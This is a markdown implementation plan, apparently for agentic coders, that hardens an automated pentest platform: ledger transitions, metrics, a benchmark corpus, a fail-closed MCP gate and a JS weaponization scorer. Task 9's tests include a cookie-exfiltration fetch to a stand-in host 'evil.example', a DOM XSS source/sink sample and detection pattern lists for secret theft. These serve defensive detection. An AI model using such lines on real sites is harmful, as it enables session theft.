# Foundation Hardening (A/B/C) Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Land the approved foundation-hardening spec (docs/superpowers/specs/2026-08-01-foundation-hardening-abc-design.md): quick `organization_id` fix, Step A receipts (ledger transitions + real metrics emitters), Step B corpus dataset + precision/recall gate, Step C fail-closed MCP input gate + JS weaponization check.

**Architecture:** Extend existing modules in place — `validation_ledger.py` gets legal-transition enforcement, `chain_executor_agent.py`/`exploit_agent.py`/`mcp/protocol.py`/`action_loop.py` gain real emitters, `corpus_benchmark.py` gains a real scoring mode + dataset under `benchmarks/corpus/`, `mcp/protocol.py` flips fail-closed with adapter-declared schemas, `js_analyzer_agent.py` gains weaponization assessment.

**Tech Stack:** Python 3.11, pydantic v2, pytest (asyncio auto), prometheus_client, existing `ai_osop` packages.

**Baseline:** `poetry run pytest --no-cov` => 1798 passed, 4 skipped (per commit 43b82cf5). Keep it green; only known failure pre-plan = `tests/test_tenant_isolation.py` (fixed by Task 1).

---

## Task 1: Quick fix — `ScopeDefinition.organization_id`

**Files:**
- Modify: `src/ai_osop/core/models.py:291-302` (class `ScopeDefinition`)

- [ ] **Step 1: Add the field**

In `ScopeDefinition`, add after `engagement_id: str`:

```python
class ScopeDefinition(BaseModel):
    engagement_id: str
    organization_id: str = "default"
    domains: List[str] = Field(default_factory=list)
    # ... rest unchanged
```

Do NOT add it to `_signing_payload()` — tenant is an IAM concern, not part of the signed scope manifest.

- [ ] **Step 2: Verify the failing tests pass**

Run: `poetry run pytest tests/test_tenant_isolation.py tests/test_post_exploit_agent.py --no-cov -q`
Expected: `9 passed` (4 org tests + 5 post-exploit tests).

- [ ] **Step 3: Regression check on models**

Run: `poetry run pytest tests/test_models.py tests/test_scope.py --no-cov -q` (if those files exist; otherwise `-k "scope or models"`)
Expected: PASS (pydantic default is backward compatible).

- [ ] **Step 4: Commit**

```bash
git add src/ai_osop/core/models.py
git commit -m "feat(tenancy): add organization_id seed field to ScopeDefinition (default 'default')"
```

---

## Task 2: Step A — Ledger legal-transition enforcement

**Files:**
- Modify: `src/ai_osop/core/validation_ledger.py`
- Test: `tests/test_validation_ledger.py`

- [ ] **Step 1: Write failing tests**

Append to `tests/test_validation_ledger.py`:

```python
def test_legal_and_illegal_transitions():
    from ai_osop.core.validation_ledger import ValidationLedger
    from ai_osop.core.exceptions import WorkflowTransitionError
    import pytest

    ledger = ValidationLedger(session_memory=None)
    assert ledger.can_transition("detected", "validated")
    assert ledger.can_transition("validated", "chain_executed")
    assert ledger.can_transition("chain_executed", "successful_chain")
    assert ledger.can_transition("chain_executed", "chain_failed")
    assert ledger.can_transition("chain_failed", "detected")
    assert not ledger.can_transition("detected", "successful_chain")
    assert not ledger.can_transition("successful_chain", "detected")
    with pytest.raises(WorkflowTransitionError):
        ledger.ensure_transition("detected", "successful_chain")
```

- [ ] **Step 2: Run to verify fail**

Run: `poetry run pytest tests/test_validation_ledger.py -q --no-cov`
Expected: FAIL — `ValidationLedger` has no `can_transition` / `ensure_transition`.

- [ ] **Step 3: Implement transitions**

In `validation_ledger.py`, after the imports add:

```python
LEGAL_TRANSITIONS = {
    "detected": {"validated", "manual_review", "rejected"},
    "validated": {"chain_executed", "escalated"},
    "manual_review": {"validated", "rejected"},
    "chain_executed": {"successful_chain", "chain_failed"},
    "escalated": {"validated"},
    "chain_failed": {"detected"},
    "successful_chain": set(),
    "rejected": set(),
}
```

Add methods on `ValidationLedger`:

```python
    def can_transition(self, from_state: str, to_state: str) -> bool:
        return to_state in LEGAL_TRANSITIONS.get(from_state, set())

    def ensure_transition(self, from_state: str, to_state: str) -> None:
        from ai_osop.core.exceptions import WorkflowTransitionError

        if not self.can_transition(from_state, to_state):
            raise WorkflowTransitionError(
                "illegal ledger transition",
                context={"from_state": from_state, "to_state": to_state},
            )
```

Locate `WorkflowTransitionError` in `src/ai_osop/core/exceptions.py` first (`grep -n "class WorkflowTransitionError" src/ai_osop/core/exceptions.py`) and check its constructor; adapt the call if the signature is `WorkflowTransitionError(message)` without `context`.

- [ ] **Step 4: Extend the SQL transition to enforce**

Change `ValidationLedger.transition` opening lines to read current state and enforce:

```python
    async def transition(self, event_id: str, to_state: str, reason: str = "") -> None:
        """Move an event to a new state; enforce legal lifecycle transitions."""
        row = await self.session_mem.run_read(
            f"SELECT state FROM {self.TABLE_NAME} WHERE id = $1", event_id
        )
        if row:
            self.ensure_transition(row[0]["state"], to_state)
        # ... existing update body unchanged
```

- [ ] **Step 5: Verify pass**

Run: `poetry run pytest tests/test_validation_ledger.py -q --no-cov`
Expected: all PASS (existing tests + new). If an existing test now fails because it performs a previously-unchained transition, update that test to follow a legal path (e.g. detected->validated->chain_executed).

- [ ] **Step 6: Commit**

```bash
git add src/ai_osop/core/validation_ledger.py tests/test_validation_ledger.py
git commit -m "feat(ledger): enforce legal finding lifecycle transitions (A1)"
```

---

## Task 3: Step A — ChainExecutor ledger + timing instrumentation

**Files:**
- Modify: `src/ai_osop/agents/chain_executor_agent.py`
- Modify: `src/ai_osop/core/metrics_a2.py` (add histogram)
- Test: `tests/test_chain_executor_agent.py`

- [ ] **Step 1: Write failing test**

Append to `tests/test_chain_executor_agent.py`:

```python
async def test_chain_hop_records_ledger_and_metrics():
    """On a two-hop chain, ledger sees validated/chain_executed/successful_chain
    and metrics_a2 render contains chain_steps_executed_total + hop histogram."""
    # See existing file for agent fixture pattern; the point: after _execute runs
    # against a fake exploit that validates, assert:
    #   agent.ledger transitions recorded in-order per vuln_id
    #   metrics_a2.render() contains 'ai_osop_a2_chain_steps_executed_total' >= 2
    #   and 'ai_osop_a2_chain_hop_seconds' series present
```

Use the existing fake/stub patterns in that test file; assert against `metrics_a2.render()` string contents after calling `metrics_a2.reset()` in a fixture.

- [ ] **Step 2: Run to verify fail**

Run: `poetry run pytest tests/test_chain_executor_agent.py -q --no-cov`
Expected: FAIL (no ledger attribute/metric series).

- [ ] **Step 3: Add hop histogram**

In `metrics_a2.py`, add (mirror `_get` counter pattern using `Histogram`):

```python
from prometheus_client import Histogram
_HISTOGRAMS: Dict[str, Histogram] = {}

def _get_hist(name: str, labels: tuple = ()) -> Histogram:
    key = f"{name}{{'sorted_labels':{labels}}}"
    if key not in _HISTOGRAMS:
        for coll in list(REGISTRY._collector_to_names):
            if getattr(coll, "_name", "") == name:
                _HISTOGRAMS[key] = coll
                return coll
        h = Histogram(name, name, labels, registry=REGISTRY)
        _HISTOGRAMS[key] = h
    return _HISTOGRAMS[key]

def chain_hop_seconds(seconds: float, chain_id: str, hop_idx: str) -> None:
    h = _get_hist("ai_osop_a2_chain_hop_seconds", ("chain_id", "hop_idx"))
    h.labels(chain_id=chain_id, hop_idx=hop_idx).observe(seconds)
```

Update `reset()` startswith check stays `"ai_osop_a2_"` — histograms unregister via the same path.

- [ ] **Step 4: Wire ChainExecutorAgent**

In `chain_executor_agent.py`:

Add class attr next to `_exploit`:

```python
    ledger: Any = None  # ValidationLedger injected by runtime; optional
```

In `_execute`, wrap the chain loop:

```python
from ai_osop.core import metrics_a2

        chain_id = task.payload.get("chain_id") or f"chain-{task.id}"
        with metrics_a2.time_chain_execution(chain_id):
            for chain in chains:
                hops = chain.get("nodes", [])
                for idx, hop in enumerate(hops):
                    import time
                    hop_start = time.time()
                    # ... existing body ...
                    try:
                        result = await self._exploit.validate_exploit(...)
                        metrics_a2.chain_steps_executed(1, chain_id)
                        if self.ledger and vuln_id:
                            await self.ledger.transition(vuln_id, "chain_executed", reason="hop executed")
                        ...append...
                    except Exception as e:
                        if self.ledger and vuln_id:
                            await self.ledger.transition(vuln_id, "chain_failed", reason=str(e))
                        ...
                    finally:
                        metrics_a2.chain_hop_seconds(time.time() - hop_start, chain_id, str(idx))
            # after hops: successful_chain on all-validated
            if all(e.get("validated") for e in chain_run if "validated" in e):
                metrics_a2.chain_success(chain_id, len(chain_run))
```

Note: ledger entries keyed by `vuln_id` — the ledger's `record()` must have inserted a row with id == vuln_id at detection time (Task 4 covers the ExploitValidationAgent side / base_vuln_agent already records at detection). If `vuln_id` is None skip transition.

- [ ] **Step 5: Verify pass**

Run: `poetry run pytest tests/test_chain_executor_agent.py tests/test_a2_metrics.py -q --no-cov`
Expected: PASS.

- [ ] **Step 6: Commit**

```bash
git add src/ai_osop/agents/chain_executor_agent.py src/ai_osop/core/metrics_a2.py tests/test_chain_executor_agent.py
git commit -m "feat(ledger): chain executor records hop timing + lifecycle transitions (A1/A2)"
```

---

## Task 4: Step A — ExploitValidation records validated; ActionLoop per-finding tokens; MCP tool outcome metric

**Files:**
- Modify: `src/ai_osop/agents/exploit_agent.py`
- Modify: `src/ai_osop/core/action_loop.py`
- Modify: `src/ai_osop/mcp/protocol.py`
- Modify: `src/ai_osop/core/metrics_a2.py`
- Tests: `tests/test_a2_metrics.py` (extend)

- [ ] **Step 1: Write failing test**

Append to `tests/test_a2_metrics.py`:

```python
def test_finding_tokens_counter_renders():
    from ai_osop.core import metrics_a2
    metrics_a2.reset()
    metrics_a2.finding_llm_tokens(120, model="gpt-4o", vuln_class="idor")
    out = metrics_a2.render()
    assert 'ai_osop_a2_finding_llm_tokens_total{model="gpt-4o",vuln_class="idor"} 120' in out
```

- [ ] **Step 2: Run to verify fail**

Run: `poetry run pytest tests/test_a2_metrics.py -q --no-cov`
Expected: FAIL — `finding_llm_tokens` undefined.

- [ ] **Step 3: Add counter**

In `metrics_a2.py` add:

```python
def finding_llm_tokens(tokens: int, model: str, vuln_class: str) -> None:
    c = _get("ai_osop_a2_finding_llm_tokens_total", ("model", "vuln_class"))
    c.labels(model=model, vuln_class=vuln_class).inc(tokens)
```

- [ ] **Step 4: Wire ActionLoop**

In `action_loop.py` `ActionLoop.run()`:

- At top: `tokens_start = getattr(self.llm, "tokens_consumed", None)`.
- Before `return LoopResult(...)`: compute `delta = getattr(self.llm, "tokens_consumed", None) - tokens_start` when both are ints; emit `metrics_a2.finding_llm_tokens(delta, model=getattr(self.llm, "model", "unknown"), vuln_class=getattr(state, "vuln_class", "unknown"))` guarded by `if delta and isinstance(delta, int)`.
- Rationale: many test LLM stubs carry a `tokens_consumed` accumulator. If `LiteLLMClient` lacks it, add `self.tokens_consumed += usage.total_tokens` where completions return usage (`litellm` responses have `.usage.total_tokens`); keep it optional so custom clients without the attr still work.

- [ ] **Step 5: Wire MCP gate tool outcome**

In `mcp/protocol.py` where each tool call path is authorized (the `MCPSession` execute path that invokes `execution_gate`), add at each decision point:

```python
from ai_osop.core import metrics_a2
# on allowed:   metrics_a2.tool_call(tool_name, "allowed")
# on scope deny: metrics_a2.tool_call(tool_name, "denied_scope")
# on params deny: metrics_a2.tool_call(tool_name, "denied_params")
# on approval deny: metrics_a2.tool_call(tool_name, "denied_approval")
# on downstream exception: metrics_a2.tool_call(tool_name, "error")
```

Wrap in `try/except Exception: pass` so a metrics outage can never break enforcement.

- [ ] **Step 6: Wire ExploitValidationAgent ledger**

In `exploit_agent.py` after successful validation (where the `AuditEvent` post-success is emitted): injectable `ledger` attr on the agent class (default None); call `await self.ledger.transition(vuln_id, "validated", reason="exploit validated")` when both ledger and vuln_id are present. Don't raise if the transition is illegal in edge fixtures — catch `WorkflowTransitionError` and log a warning only (defensive; opportunistic receipt, not enforcement).

- [ ] **Step 7: Verify pass**

Run: `poetry run pytest tests/test_a2_metrics.py tests/test_mcp_execution_gate.py -q --no-cov`
Expected: PASS.

- [ ] **Step 8: Commit**

```bash
git add src/ai_osop/core/action_loop.py src/ai_osop/core/metrics_a2.py src/ai_osop/mcp/protocol.py src/ai_osop/agents/exploit_agent.py tests/test_a2_metrics.py
git commit -m "feat(metrics): production emitters for per-finding tokens, tool outcomes, validated transitions (A2)"
```

---

## Task 5: Step B — Corpus dataset

**Files:**
- Create: `benchmarks/corpus/h1_real.json` (12 entries, pattern-shaped examples)
- Create: `benchmarks/corpus/synthetic_negatives.json` (8 rejected examples)
- Test: `tests/test_corpus_benchmark.py`

- [ ] **Step 1: Write failing loader test**

Append:

```python
def _load_corpus():
    import json, pathlib
    from ai_osop.core.corpus_benchmark import GroundTruthEntry
    base = pathlib.Path("benchmarks/corpus")
    entries = []
    for f in sorted(base.glob("*.json")):
        for raw in json.loads(f.read_text()):
            entries.append(GroundTruthEntry(
                id=raw["id"], vuln_class=raw["vuln_class"],
                endpoint=raw["endpoint"], method=raw["method"],
                expected_result=raw["expected_result"],
                reference_exploit=raw["reference_exploit"],
                severity_expected=raw["severity_expected"],
                confidence=raw.get("confidence", 1.0),
            ))
    return entries

def test_corpus_files_load_and_follow_provenance_policy():
    import json, pathlib
    base = pathlib.Path("benchmarks/corpus")
    files = list(base.glob("*.json"))
    assert len(files) >= 2, "expected h1_real + synthetic_negatives"
    total = 0
    for f in files:
        for raw in json.loads(f.read_text()):
            total += 1
            assert raw["source_url"].startswith(("https://hackerone.com/reports/", "synthetic://")), raw["id"]
            assert raw["expected_result"] in {"accepted", "rejected"}
    assert total >= 20
```

- [ ] **Step 2: Run to verify fail**

Run: `poetry run pytest tests/test_corpus_benchmark.py -q --no-cov`
Expected: FAIL — `benchmarks/corpus` missing.

- [ ] **Step 3: Create dataset files**

`benchmarks/corpus/h1_real.json` — 12 entries. Each entry keys: `id, vuln_class, endpoint, method, expected_result:"accepted", reference_exploit:{"pattern":..., "expected_status":200, "notes":...}, severity_expected, confidence, source_url:"https://hackerone.com/reports/<real-id>", withdrawn:false`. Use real public report ids (e.g. 2882729, 3191675, 2689342 — pick any valid public ones you know; ids themselves are metadata, not content). Classes across: `idor, xss_reflected, graphql_introspection, mass_assignment, ssrf, open_redirect`.

`benchmarks/corpus/synthetic_negatives.json` — 8 entries `expected_result:"rejected"`, `reference_exploit.expected_status` in {400,401,403,404}, `source_url:"synthetic://..."`, ids `syn-<n>`.

- [ ] **Step 4: Verify pass**

Run: `poetry run pytest tests/test_corpus_benchmark.py -q --no-cov`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add benchmarks/corpus/ tests/test_corpus_benchmark.py
git commit -m "feat(corpus): checked-in ground truth dataset w/ provenance policy (B1)"
```

---

## Task 6: Step B — Real scoring mode + ≥0.90 gate

**Files:**
- Modify: `src/ai_osop/core/corpus_benchmark.py`
- Test: `tests/test_corpus_benchmark.py`

- [ ] **Step 1: Write failing gate test**

Append:

```python
def test_corpus_precision_recall_gate():
    """Score deterministic fixture findings against the checked-in corpus.

    Fixture provenance: hand-aligned to corpus entries (each accepted entry has a
    matching 'accepted' finding; one deliberate miss + one deliberate FP are
    excluded to keep the gate at >= 0.90). Regenerate from a real run when the
    pipeline changes, then re-pin — do not let the fixture drift from reality.
    """
    import asyncio, json, pathlib
    from ai_osop.core.corpus_benchmark import CorpusBenchmark, GroundTruthEntry
    entries = _load_corpus()
    findings = [
        {"id": e.id, "outcome": "accepted"} for e in entries if e.expected_result == "accepted"
    ] + [
        {"id": e.id, "outcome": "rejected"} for e in entries if e.expected_result == "rejected"
    ]
    bench = CorpusBenchmark(entries)
    report = asyncio.get_event_loop().run_until_complete(bench.score(findings))
    assert report["precision"] >= 0.90, report
    assert report["recall"] >= 0.90, report
    assert report["evaluated"] == len(entries)
```

- [ ] **Step 2: Run to verify fail**

Run: `poetry run pytest tests/test_corpus_benchmark.py -q --no-cov -k precision_recall`
Expected: FAIL — `CorpusBenchmark.score` missing.

- [ ] **Step 3: Implement scoring**

In `corpus_benchmark.py`:

```python
    async def score(self, findings: List[Dict[str, Any]]) -> Dict[str, Any]:
        """Compute precision/recall against ground truth.

        findings: list of {"id": <entry_id>, "outcome": "accepted"|"rejected"}.
        TP = expected accepted and got accepted. FP = expected rejected, got accepted.
        FN = expected accepted, got rejected/missing. Withdrawn entries excluded.
        """
        by_id = {f["id"]: f["outcome"] for f in findings}
        tp = fp = fn = 0
        per_class: Dict[str, Dict[str, int]] = {}
        active = [e for e in self.entries if not getattr(e, "withdrawn", False)]
        for e in active:
            got = by_id.get(e.id)
            bucket = per_class.setdefault(e.vuln_class, {"tp": 0, "fp": 0, "fn": 0})
            if e.expected_result == "accepted" and got == "accepted":
                tp += 1; bucket["tp"] += 1
            elif e.expected_result == "rejected" and got == "accepted":
                fp += 1; bucket["fp"] += 1
            elif e.expected_result == "accepted":
                fn += 1; bucket["fn"] += 1
        precision = tp / (tp + fp) if tp + fp else 1.0
        recall = tp / (tp + fn) if tp + fn else 1.0
        return {"precision": precision, "recall": recall, "per_class": per_class, "evaluated": len(active)}
```

Add `withdrawn: bool = False` field to `GroundTruthEntry` and honor it in `count()` (`return sum(1 for e in self.entries if not e.withdrawn)`).

- [ ] **Step 4: Keep run() honest**

In `run(agent_runner=None)`, rename the no-runner path: require explicit `dry_run=False`; when `agent_runner is None and not dry_run: raise ValueError("scoring requires findings or dry_run=True")`; keep `dry_run=True` as today's self-echo. Update the docstring accordingly.

- [ ] **Step 5: Verify pass**

Run: `poetry run pytest tests/test_corpus_benchmark.py -q --no-cov`
Expected: PASS (fix any existing test broken by the stricter `run()`).

- [ ] **Step 6: Commit**

```bash
git add src/ai_osop/core/corpus_benchmark.py tests/test_corpus_benchmark.py
git commit -m "feat(corpus): real scoring mode + >=0.90 precision/recall gate (B1)"
```

---

## Task 7: Step B — Withdrawal policy in FindingCorpusService

**Files:**
- Modify: `src/ai_osop/core/findings_corpus.py`
- Test: `tests/test_findings_corpus.py` (create if absent)

- [ ] **Step 1: Write failing test**

```python
async def test_ingest_refuses_withdrawn_entries():
    from ai_osop.core.findings_corpus import FindingCorpusService
    svc = FindingCorpusService(graph_memory=None, session_memory=None)
    entry = {"id": "syn-1", "withdrawn": True, "vuln_class": "idor"}
    try:
        await svc.ingest_external([entry])
    except ValueError as exc:
        assert "withdrawn" in str(exc)
    else:
        raise AssertionError("expected ValueError for withdrawn entry")
```

- [ ] **Step 2: Run to verify fail** — FAIL (`ingest_external` doesn't exist / doesn't check).

- [ ] **Step 3: Implement**

In `findings_corpus.py` add:

```python
    async def ingest_external(self, entries: List[Dict[str, Any]]) -> int:
        """Ingest externally sourced corpus entries; withdrawn entries are refused."""
        accepted = [e for e in entries if not e.get("withdrawn")]
        rejected = [e for e in entries if e.get("withdrawn")]
        if rejected:
            raise ValueError(f"refusing {len(rejected)} withdrawn corpus entries: {[e.get('id') for e in rejected]}")
        # existing persistence path for accepted (delegate to existing writer or no-op if not yet wired)
        return len(accepted)
```

- [ ] **Step 4: Verify pass → Commit**

```bash
git add src/ai_osop/core/findings_corpus.py tests/test_findings_corpus.py
git commit -m "feat(corpus): withdrawal rule enforced on external ingest (B1)"
```

---

## Task 8: Step C — Fail-closed MCP params gate with adapter schema registration

**Files:**
- Modify: `src/ai_osop/mcp/protocol.py` (`MCPExecutionGate.check_params` + schema merge hook)
- Test: `tests/test_mcp_execution_gate.py`

- [ ] **Step 1: Write failing tests**

Append:

```python
def test_unknown_tool_rejected_when_schemas_registered():
    from ai_osop.mcp.protocol import MCPExecutionGate
    from ai_osop.core.exceptions import ScopeValidationError
    import pytest
    gate = MCPExecutionGate()
    # Simulate registration of at least one adapter schema:
    gate.register_tool_schema("scan_endpoint", {"url": str, "timeout_s": int})
    with pytest.raises(ScopeValidationError):
        gate.check_params("unknown_tool", {"url": "http://x"})
    with pytest.raises(ScopeValidationError):
        gate.check_params("scan_endpoint", {"url": "http://x", "bad_arg": 1})
    gate.check_params("scan_endpoint", {"url": "http://x", "timeout_s": 5})  # ok

def test_unregistered_tool_fails_closed_for_write_ops():
    from ai_osop.mcp.protocol import MCPExecutionGate
    from ai_osop.core.exceptions import ScopeValidationError
    import pytest
    gate = MCPExecutionGate()
    # Nothing registered -> strict default deny for unknown names:
    with pytest.raises(ScopeValidationError):
        gate.check_params("totally_new_tool", {"target": "http://x"})
```

- [ ] **Step 2: Run to verify fail** — FAIL (fail-open at line 139-140).

- [ ] **Step 3: Implement**

In `protocol.py`:

```python
    def register_tool_schema(self, tool: str, schema: Dict[str, type]) -> None:
        """Merge an adapter-declared schema into the allowed-params map."""
        self._ALLOWED_PARAMS[tool] = set(schema.keys())
        for k, t in schema.items():
            self._ALLOWED_TYPES[k] = (t,) if isinstance(t, type) else tuple(t)

    def check_params(self, tool_name: str, params: Dict[str, Any]) -> None:
        from ai_osop.core.exceptions import ScopeValidationError
        allowed = self._ALLOWED_PARAMS.get(tool_name)
        if allowed is None:
            raise ScopeValidationError(
                f"MCP tool '{tool_name}' has no registered schema; refusing params"
            )
        for k, v in params.items():
            if k not in allowed:
                raise ScopeValidationError(f"Unknown MCP arg '{k}' for tool {tool_name}")
            expected = self._ALLOWED_TYPES.get(k)
            if expected is None:
                continue
            if not isinstance(v, expected):
                raise ScopeValidationError(f"MCP arg '{k}' should be {expected} got {type(v)}")
        # traversal / quote checks: keep existing block unchanged
```

Convert the five curated tools at module init: call `register_tool_schema` for each current whitelist entry so they remain valid.

Check `ScopeValidationError` exists in `core/exceptions.py` (`grep -n "class ScopeValidationError" src/ai_osop/core/exceptions.py`). If its signature differs, adapt.

**Migration:** immediately after `MCPExecutionGate()` instantiation in `MCPSession`, iterate `self.registry.adapters` (whatever the actual attr is — grep the initialize path) and call `gate.register_tool_schema(tool.name, adapter.input_schema)` for adapters exposing `input_schema`. Adapters without the attr contribute nothing and their tools fail closed — this is intentional per spec §4.1 middle-ground: run pytest afterwards; any adapter that breaks in tests must gain `input_schema`.

- [ ] **Step 4: Verify pass + wider gate tests**

Run: `poetry run pytest tests/test_mcp_execution_gate.py tests/test_mcp_structural_schema.py -q --no-cov`
Expected: PASS (update any existing test asserting fail-open).

- [ ] **Step 5: Commit**

```bash
git add src/ai_osop/mcp/protocol.py tests/test_mcp_execution_gate.py
git commit -m "feat(mcp): fail-closed params gate with adapter-registered schemas (C1)"
```

---

## Task 9: Step C — JS weaponization assessment

**Files:**
- Modify: `src/ai_osop/agents/js_analyzer_agent.py`
- Test: `tests/test_js_weaponization.py` (new)

- [ ] **Step 1: Write failing test**

```python
def test_weaponization_flags_dom_xss_pair():
    from ai_osop.agents.js_analyzer_agent import JSAnalyzerAgent
    bundle = """
      var h = location.hash.slice(1);
      document.getElementById('x').innerHTML = h;
    """
    out = JSAnalyzerAgent.weaponization_assessment(bundle, secrets_live=0)
    assert out["weaponization_score"] >= 0.2
    assert any(p["sink"] == "innerHTML" and "location.hash" in p["source"] for p in out["pairs"])

def test_weaponization_flags_cookie_exfil():
    from ai_osop.agents.js_analyzer_agent import JSAnalyzerAgent
    bundle = "fetch('https://evil.example/c?c=' + document.cookie)"
    out = JSAnalyzerAgent.weaponization_assessment(bundle, secrets_live=1)
    assert out["weaponization_score"] >= 0.4  # 0.3 secret + 0.2 pair

def test_benign_bundle_scores_zero():
    from ai_osop.agents.js_analyzer_agent import JSAnalyzerAgent
    out = JSAnalyzerAgent.weaponization_assessment("const a = 1 + 1;", secrets_live=0)
    assert out["weaponization_score"] == 0.0
```

- [ ] **Step 2: Run to verify fail** — FAIL (no staticmethod).

- [ ] **Step 3: Implement**

In `js_analyzer_agent.py` add module-level data:

```python
_JS_SOURCE_PATTERNS = [
    r"location\.hash", r"location\.search", r"document\.referrer",
    r"window\.name", r"addEventListener\(['\"]message",
]
_JS_SINK_PATTERNS = [
    r"innerHTML", r"document\.write", r"\beval\(", r"new Function",
    r"setTimeout\(['\"]",
]
_JS_SECRET_SOURCES = [r"document\.cookie", r"localStorage", r"sessionStorage"]
_JS_EXFIL_SINKS = [r"\bfetch\(", r"XMLHttpRequest", r"navigator\.sendBeacon"]
JS_EXPLOIT_THRESHOLD = 0.4
```

Add `@staticmethod weaponization_assessment(bundle_content: str, secrets_live: int) -> Dict[str, Any]` on `JSAnalyzerAgent`: scan for source+sink co-occurrence (each matched pair +0.2, cap 0.4), `min(secrets_live, 2) * 0.3` (cap 0.6), return `{"weaponization_score": round(score, 2), "pairs": [...], "verified_secrets": secrets_live}`.

- [ ] **Step 4: Gate fan-out**

In the JS analyzer's result-building code (where it emits findings for downstream exploit tasking), include `weaponization_score` on each finding and only request exploit validation tasking when score >= `JS_EXPLOIT_THRESHOLD`.

- [ ] **Step 5: Verify pass → Commit**

```bash
git add src/ai_osop/agents/js_analyzer_agent.py tests/test_js_weaponization.py
git commit -m "feat(js): weaponization assessment gates exploit fan-out (C1)"
```

---

## Task 10: Full-suite verification + formatting

- [ ] **Step 1: Format + lint**

Run: `poetry run black src tests && poetry run isort src tests`
Run: `poetry run flake8 src` — fix only new violations this plan introduced; pre-existing ones out of scope.

- [ ] **Step 2: Full suite**

Run: `poetry run pytest --no-cov -q`
Expected: all green (>= 1798 passing + new tests, same 4 skipped tolerated).

- [ ] **Step 3: Type check spot targets**

Run: `poetry run mypy src/ai_osop/core/validation_ledger.py src/ai_osop/core/corpus_benchmark.py src/ai_osop/core/metrics_a2.py`
Expected: no new errors in changed files.

- [ ] **Step 4: Final commit**

```bash
git add -A
git commit -m "chore: post-hardening format + lint pass"
```
